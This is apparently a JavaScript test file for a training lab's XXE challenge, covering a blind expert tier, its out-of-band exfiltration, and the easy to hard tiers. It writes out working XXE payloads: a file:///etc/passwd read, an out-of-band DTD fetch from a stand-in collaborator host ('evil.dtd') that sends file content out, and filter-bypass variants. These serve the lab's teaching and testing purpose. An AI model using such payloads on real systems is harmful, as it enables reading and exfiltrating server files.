/**
 * tests/xxe-expert-tier.test.js — Phase 7 addition: genuine Expert-tier
 * content for xxe (upgrade-spec Section 15's fourth tier, Section 24's
 * explicitly-named "blind XXE"). Fourth lab with real Expert content,
 * after ssrf, jwt-vulnerabilities, and sql-injection.
 *
 * The technique: the response never reflects entity content at all (a
 * genuinely blind sink — verified by confirming even the classic in-band
 * payload from the other 3 tiers produces identical output whether or not
 * the referenced file exists). Exfiltration works out-of-band: an
 * external parameter entity referencing a fake collaborator host chains a
 * file read into a callback logged server-side, checked via a separate
 * endpoint — the real shape of a Burp Collaborator-style OOB workflow.
 */
const http = require("http");

let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 30000).unref();

function get(urlPath, cookies) {
  return new Promise((resolve, reject) => {
    const options = cookies ? { headers: { Cookie: cookies } } : {};
    http.get(`http://localhost:3000${urlPath}`, options, (res) => {
      let body = "";
      res.on("data", (d) => (body += d));
      res.on("end", () => resolve({ status: res.statusCode, body, setCookies: res.headers["set-cookie"] || [] }));
    }).on("error", reject);
  });
}
function extractCookie(setCookies, name) {
  const line = setCookies.find((c) => c.startsWith(name + "="));
  return line ? line.split(";")[0] : null;
}
function xxeUrl(difficulty, xml) {
  return `/vuln/xxe?difficulty=${difficulty}&xml=${encodeURIComponent(xml)}`;
}

const CLASSIC_PAYLOAD = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><feedback><name>x</name><comment>&xxe;</comment></feedback>`;
const OOB_PAYLOAD = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://oob-collab.securecorp-demo.test/evil.dtd"><!ENTITY % file SYSTEM "file:///etc/passwd">%remote;]><feedback><name>x</name><comment>oob</comment></feedback>`;
const INERT_PAYLOAD = `<feedback><name>x</name><comment>just plain text, nothing special</comment></feedback>`;

async function run() {
  // --- the classic in-band technique genuinely doesn't work at expert ---
  const rClassic = await get(xxeUrl("expert", CLASSIC_PAYLOAD));
  const cookies = extractCookie(rClassic.setCookies, "sid");
  check("expert: classic in-band payload responds 200", rClassic.status === 200);
  check("expert: classic payload's response does NOT contain the file content (genuinely blind)", !/root:x:0:0/.test(rClassic.body));
  check("expert: no flag from the in-band technique either", !/FLAG\{/.test(rClassic.body));

  // --- an inert payload and the classic payload look IDENTICAL in the response (true blindness) ---
  const rInert = await get(xxeUrl("expert", INERT_PAYLOAD), cookies);
  const normalize = (s) => s.match(/<div class="result">([^<]*)<\/div>/)[1];
  check("expert: response text is identical for an inert payload vs. an attempted (failing) exploit — true blind behavior, not just 'no flag'", normalize(rClassic.body) === normalize(rInert.body));

  // --- collab log starts empty for a fresh session -----------------------
  const rLogEmpty = await get("/vuln/xxe/collab-log?difficulty=expert", cookies);
  check("collab-log starts with no callbacks for this session", /no callbacks yet/.test(rLogEmpty.body));
  check("collab-log issues no flag when empty", !/FLAG\{/.test(rLogEmpty.body));

  // --- the real OOB technique works ---------------------------------------
  const rOob = await get(xxeUrl("expert", OOB_PAYLOAD), cookies);
  check("expert: OOB payload also responds 200 (still blind — no content in THIS response either)", rOob.status === 200 && !/root:x:0:0/.test(rOob.body));

  const rLogFilled = await get("/vuln/xxe/collab-log?difficulty=expert", cookies);
  check("collab-log now shows the exfiltrated file content", /root:x:0:0:root:\/root:\/bin\/bash/.test(rLogFilled.body), rLogFilled.body.slice(0, 300));
  const flagMatch = rLogFilled.body.match(/FLAG\{xxe-expert-[a-f0-9]+\}/);
  check("a real, correctly-tiered flag is issued via the collab log", !!flagMatch);

  // --- a DIFFERENT session's collab log is unaffected (session isolation) ---
  const rOtherSession = await get("/vuln/xxe/collab-log?difficulty=expert");
  check("a different (fresh) session's collab log is empty — exfiltration is session-scoped, not global", /no callbacks yet/.test(rOtherSession.body));

  // --- confirm the other 3 tiers are completely unchanged -----------------
  const rEasy = await get(xxeUrl("easy", CLASSIC_PAYLOAD));
  check("easy tier: classic in-band technique still works exactly as before", /FLAG\{xxe-easy-/.test(rEasy.body) && /root:x:0:0/.test(rEasy.body));

  const pubPayload = CLASSIC_PAYLOAD.replace("SYSTEM", 'PUBLIC ""');
  const rMedium = await get(xxeUrl("medium", pubPayload));
  check("medium tier: PUBLIC-entity technique still works exactly as before", /FLAG\{xxe-medium-/.test(rMedium.body));

  const spacedPayload = CLASSIC_PAYLOAD.replace("SYSTEM", "SY STEM").replace("PUBLIC", "PUBLIC");
  const rHard = await get(xxeUrl("hard", spacedPayload));
  check("hard tier: filter/parser mismatch technique still works exactly as before", /FLAG\{xxe-hard-/.test(rHard.body));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}

run().catch((e) => { console.error("ERROR:", e.message); process.exit(1); });
